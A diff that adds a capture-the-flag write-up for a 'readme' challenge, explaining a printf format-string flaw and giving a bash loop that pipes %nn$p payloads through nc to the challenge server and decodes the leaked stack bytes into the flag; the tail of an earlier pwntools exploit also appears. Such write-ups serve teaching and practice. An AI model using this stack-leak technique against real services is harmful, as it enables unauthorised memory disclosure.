@@ -47,3 +47,23 @@ p.sendlineafter('?\n',payload)
 p.interactive()
 ```
 FLAG : ``dctf{y0u_kn0w_wh4t_15_h4pp3n1ng_b75?}``
+
+# ***README***
+
+The vuln function reads flag.txt into a local (local_58) stack array.
+
+The vulnerability is the printf(local_38) statement that is missing a format string. Exfiltrating the flag is as simple as passing %nn$p format strings where nn is the position in the stack; starting from 6 just increment until the output starts with dctf (nn = 8), then continue until you have the flag.
+
+```c
+for((p=8;p<14;p++)) {
+    echo '%'$p'$p' | \
+    nc dctf-chall-readme.westeurope.azurecontainer.io 7481 | \
+    grep 'hello ' | \
+    awk -Fx '{print $NF}' | \
+    xxd -r -p | \
+    rev
+}
+```
+
+This bash script will echo %8$p, then echo %9$p, etc... into the challenge service serially (one by one), capturing the output (grep, awk), converting to text (xxd), and then finally reversing the string (rev, since x86_64 is little endian).
+
